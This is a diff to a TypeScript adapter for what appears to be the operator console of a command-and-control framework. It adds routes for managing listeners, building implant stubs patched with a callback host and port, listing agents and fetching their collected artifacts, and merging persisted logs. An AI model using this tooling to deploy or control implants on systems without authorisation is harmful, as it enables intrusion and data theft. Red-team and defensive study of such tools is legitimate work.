@@ -191,7 +191,74 @@ async function realHandle(config: AxiosRequestConfig): Promise<AxiosResponse> {
     return ok(config, { success: true, data: implants.map(implantToBeacon) })
   }
   if (method === 'get' && path === '/listeners') {
-    return ok(config, { success: true, data: [] })
+    const listeners = await Wails.ListListeners()
+    return ok(config, { success: true, data: listeners.map((l: any) => ({
+      ...l,
+      id: l.id,
+      name: l.name || `tcp/${l.port}`,
+      protocol: l.protocol || 'tcp',
+      bind_ip: l.bind_ip || '0.0.0.0',
+      port: Number(l.port) || 0,
+      status: l.active ? 'running' : 'stopped',
+      active: !!l.active,
+    })) })
+  }
+  if (method === 'post' && path === '/listeners') {
+    const body = parseBody(config)
+    const l = await Wails.CreateListener(String(body?.name || ''), String(body?.bind_ip || '0.0.0.0'), String(body?.port || ''))
+    return ok(config, { success: true, data: { id: l.id } })
+  }
+  if (method === 'put' && path.startsWith('/listeners/')) {
+    const id = path.split('/')[2]
+    const body = parseBody(config)
+    await Wails.UpdateListener(id, String(body?.name || ''), String(body?.bind_ip || ''), String(body?.port || ''))
+    return ok(config, { success: true, data: {} })
+  }
+  if (method === 'post' && path.startsWith('/listeners/')) {
+    // /listeners/{id}/start | /listeners/{id}/stop
+    const parts = path.split('/')
+    const id = parts[2]
+    const action = parts[3]
+    if (id && (action === 'start' || action === 'stop')) {
+      await Wails.ToggleListener(id, action === 'start')
+      return ok(config, { success: true, data: {} })
+    }
+  }
+  if (method === 'delete' && path.startsWith('/listeners/')) {
+    const id = path.split('/')[2]
+    await Wails.DeleteListener(id)
+    return ok(config, { success: true, data: {} })
+  }
+  // Stub builder — patches the implant exe via the core and pops the OS Save
+  // As dialog (handled in the Go bridge). Returns {path} (empty if cancelled).
+  if (method === 'post' && path === '/stub/build') {
+    const body = parseBody(config)
+    const host = String(body?.host || '')
+    const port = String(body?.port || '')
+    const name = String(body?.name || '')
+    const r = await Wails.BuildStubToProject(host, port, name)
+    return ok(config, { success: true, data: { path: r.path } })
+  }
+  // Persistent agent roster + artifacts.
+  if (method === 'get' && path === '/agents') {
+    const agents = await Wails.ListAgents()
+    return ok(config, { success: true, data: agents })
+  }
+  if (method === 'get' && path.startsWith('/agents/')) {
+    // /agents/{id}/artifacts?kind=&limit=  |  /agents/{id}/artifacts/{aid}
+    const parts = path.split('/') // ['', 'agents', id, 'artifacts', aid?]
+    const id = Number(parts[2])
+    if (parts[3] === 'artifacts' && id) {
+      if (parts[4]) {
+        // fetch one artifact
+        const [kind, b64, meta] = await Wails.GetArtifact(id, Number(parts[4]))
+        return ok(config, { success: true, data: { id: parts[4], kind, b64, meta } })
+      }
+      const kind = config.params?.kind || ''
+      const limit = Number(config.params?.limit) || 50
+      const arts = await Wails.ListArtifacts(id, String(kind), limit)
+      return ok(config, { success: true, data: arts })
+    }
   }
   if ((method === 'post' || method === 'delete') && path.startsWith('/nodes/')) {
     // /nodes/{id} | /nodes/{id}/stop | /nodes/{id}/delete
@@ -256,7 +323,22 @@ async function realHandle(config: AxiosRequestConfig): Promise<AxiosResponse> {
     return ok(config, { success: true, data: { output: t.output || '', error: failed ? t.output : '', success: !failed, status: t.status, id: t.id } })
   }
   if (method === 'get' && path === '/logs') {
-    return ok(config, { success: true, data: getRealLogs() })
+    // Hydrate from the persisted SQLite logs (survives core restart) and merge
+    // in any live tail still in the client-side buffer. The store's fetchLogs
+    // sets params.limit; implant filter optional.
+    const limit = Number(config.params?.limit) || 500
+    const implantId = Number(config.params?.implant) || 0
+    let persisted: any[] = []
+    try {
+      persisted = await Wails.GetLogs(limit, implantId)
+    } catch { /* core may be old; fall back to live buffer */ }
+    const live = getRealLogs()
+    // Dedup by id (persisted rows have ids; live buffer entries may not) —
+    // prefer persisted, append live-only entries, newest-first ordering kept
+    // by the store's normalizer.
+    const seen = new Set(persisted.map((l: any) => l.id).filter(Boolean))
+    const merged = [...persisted, ...live.filter((l: any) => !l.id || !seen.has(l.id))]
+    return ok(config, { success: true, data: merged })
   }
   if (method === 'get' && path === '/tasks') {
     return ok(config, { success: true, data: [] })
@@ -322,6 +404,17 @@ async function mockHandle(config: AxiosRequestConfig): Promise<AxiosResponse> {
 
   if (method === 'get' && path === '/nodes') return ok(config, { success: true, data: mockBeacons })
   if (method === 'get' && path === '/listeners') return ok(config, { success: true, data: mockListeners })
+  if (method === 'post' && path.startsWith('/listeners/')) {
+    // /listeners/{id}/start | /listeners/{id}/stop — flip the mock listener.
+    const parts = path.split('/')
+    const id = parts[2]
+    const action = parts[3]
+    const l = mockListeners.find((x: any) => String(x.id) === String(id))
+    if (l) {
+      l.status = action === 'start' ? 'running' : 'stopped'
+    }
+    return ok(config, { success: true, data: {} })
+  }
   if ((method === 'post' || method === 'delete') && path.startsWith('/nodes/')) {
     const id = path.split('/')[2]
     pushMockEvent('warn', id || '-', `Session ${id} terminated by operator`)
@@ -339,6 +432,11 @@ async function mockHandle(config: AxiosRequestConfig): Promise<AxiosResponse> {
   if (method === 'post' && path === '/bof/upload') {
     pushMockEvent('info', '-', 'BOF uploaded to library')
     return ok(config, { success: true, data: {} })
+  }
+  if (method === 'post' && path === '/stub/build') {
+    const body = parseBody(config)
+    const name = String(body?.name || 'ruststrike-implant')
+    return ok(config, { success: true, data: { path: `<repo>/agents/${name}.exe (mock)` } })
   }
 
   if (method === 'get' && path.startsWith('/tasks/')) {
@@ -362,7 +460,12 @@ export function installBackendAdapter(api: AxiosInstance) {
       return await realHandle(config)
     } catch (e: any) {
       if (e?.response || e?.config) throw e
-      fail(config, e?.message || 'request failed')
+      // Surface the real cause: Wails may reject a non-Error value (plain
+      // string, or an object without .message). Don't collapse those to a
+      // generic "request failed" — stringify so the operator sees what broke.
+      const msg = typeof e === 'string' ? e
+        : (e?.message || (e ? (() => { try { return JSON.stringify(e) } catch { return String(e) } })() : 'request failed'))
+      fail(config, msg)
     }
   }
 }
